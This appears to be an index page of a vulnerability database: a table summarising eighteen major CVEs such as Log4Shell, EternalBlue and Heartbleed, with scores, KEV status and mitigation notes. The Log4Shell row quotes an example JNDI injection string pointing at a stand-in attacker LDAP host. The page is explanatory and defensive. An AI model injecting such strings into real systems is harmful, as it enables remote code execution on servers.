## Curated CVE pages

| CVE | Name | CVSS | KEV | Summary |

| [CVE-2021-44228](../data/cves/2021/CVE-2021-44228.yml) | Log4Shell | 10 | ✅ | JNDI lookup injection in Apache Log4j 2. An attacker who can get a crafted string such as ${jndi:ldap://attacker/a} logged can make the server load and execute remote code. Because Log4j is embedded in a huge number of Java products, it became one of the most widely exploited vulnerabilities ever. |
| [CVE-2024-3094](../data/cves/2024/CVE-2024-3094.yml) | XZ Utils backdoor | 10 | — | A multi-year social-engineering campaign planted a backdoor in the xz compression library's release tarballs, targeting OpenSSH on some Linux distributions. Caught by chance before wide release, it is the defining case study in open-source supply-chain attacks. |
| [CVE-2024-3400](../data/cves/2024/CVE-2024-3400.yml) | PAN-OS GlobalProtect | 10 | ✅ | Command injection in the GlobalProtect feature of PAN-OS allowed unauthenticated attackers to run code as root on the firewall. Exploited as a zero-day, it underlined that edge devices need the same monitoring as servers. |
| [CVE-2014-6271](../data/cves/2014/CVE-2014-6271.yml) | Shellshock | 9.8 | ✅ | GNU Bash continued executing commands placed after function definitions in environment variables. Any service passing attacker-controlled data into the environment (CGI scripts, DHCP clients, some SSH setups) could run commands, making it a widespread remote code execution risk. |
| [CVE-2017-5638](../data/cves/2017/CVE-2017-5638.yml) | Apache Struts S2-045 | 9.8 | ✅ | The Jakarta multipart parser in Apache Struts 2 evaluated OGNL expressions from a crafted Content-Type header, allowing remote code execution. It was the entry point of the 2017 Equifax breach — a lasting lesson in patch management. |
| [CVE-2019-0708](../data/cves/2019/CVE-2019-0708.yml) | BlueKeep | 9.8 | ✅ | Pre-authentication remote code execution in Remote Desktop Services on older Windows versions. Considered wormable; Microsoft even shipped patches for unsupported systems. Patch, enable Network Level Authentication and never expose RDP directly to the Internet. |
| [CVE-2022-22965](../data/cves/2022/CVE-2022-22965.yml) | Spring4Shell | 9.8 | ✅ | Data binding in Spring MVC/WebFlux on JDK 9+ exposed class-loader properties, allowing remote code execution when deployed as a WAR on Tomcat. Upgrade Spring Framework to 5.3.18+ / 5.2.20+. |
| [CVE-2023-34362](../data/cves/2023/CVE-2023-34362.yml) | MOVEit Transfer SQLi | 9.8 | ✅ | SQL injection in the MOVEit Transfer web application was mass-exploited by the Cl0p group to steal data from thousands of organisations. One of the largest data-theft campaigns ever, it highlighted managed file-transfer appliances as prime targets. |
| [CVE-2021-26855](../data/cves/2021/CVE-2021-26855.yml) | ProxyLogon | 9.1 | ✅ | Server-side request forgery in on-premises Exchange Server that, chained with other flaws, allowed unauthenticated remote code execution. Mass exploitation in early 2021 led to web shells on tens of thousands of servers; patching alone was not enough — compromised servers needed investigation. |
| [CVE-2017-0144](../data/cves/2017/CVE-2017-0144.yml) | EternalBlue | 8.8 | ✅ | Remote code execution in the Windows SMBv1 server. Leaked publicly in 2017, it powered the WannaCry and NotPetya outbreaks. Patch MS17-010, disable SMBv1 and block SMB at network boundaries. |
| [CVE-2021-34527](../data/cves/2021/CVE-2021-34527.yml) | PrintNightmare | 8.8 | ✅ | The Windows Print Spooler service could be abused to install printer drivers and run code as SYSTEM, locally or remotely. Disable the Print Spooler where it isn't needed — especially on domain controllers — and apply the Point and Print hardening. |
| [CVE-2021-4034](../data/cves/2021/CVE-2021-4034.yml) | PwnKit | 7.8 | ✅ | Memory corruption in polkit's pkexec, installed by default on most Linux distributions, gave any local user root. The bug had existed since 2009. |
| [CVE-2022-0847](../data/cves/2022/CVE-2022-0847.yml) | Dirty Pipe | 7.8 | ✅ | Improper initialisation of pipe buffer flags allowed overwriting data in read-only files through the page cache, giving local users a simple path to root. Found while debugging corrupted log files. |
| [CVE-2022-30190](../data/cves/2022/CVE-2022-30190.yml) | Follina | 7.8 | ✅ | Office documents could invoke the Microsoft Support Diagnostic Tool via the ms-msdt URL protocol and run code, even without macros. A reminder that URL protocol handlers are attack surface; Microsoft later hardened MSDT. |
| [CVE-2014-0160](../data/cves/2014/CVE-2014-0160.yml) | Heartbleed | 7.5 | ✅ | Missing bounds check in OpenSSL's TLS heartbeat extension let a remote peer read up to 64 KB of server memory per request, exposing private keys, session cookies and passwords. It prompted mass certificate revocation and a rethink of open-source infrastructure funding. |
| [CVE-2023-4966](../data/cves/2023/CVE-2023-4966.yml) | Citrix Bleed | 7.5 | ✅ | Buffer over-read in NetScaler ADC and Gateway leaked memory containing valid session tokens, letting attackers hijack authenticated sessions and bypass MFA. After patching, all active sessions had to be terminated. |
| [CVE-2016-5195](../data/cves/2016/CVE-2016-5195.yml) | Dirty COW | 7 | ✅ | Race condition in the Linux kernel's copy-on-write handling let a local user write to read-only memory mappings and escalate to root. Present for nine years before being fixed. |
| [CVE-2020-1472](../data/cves/2020/CVE-2020-1472.yml) | Zerologon | 5.5 | ✅ | A flaw in the cryptography of the Netlogon protocol let an unauthenticated attacker on the network impersonate any machine to a domain controller, including resetting the DC's own account password — full domain compromise in seconds. Enforce secure RPC (enforcement mode) on all DCs. |
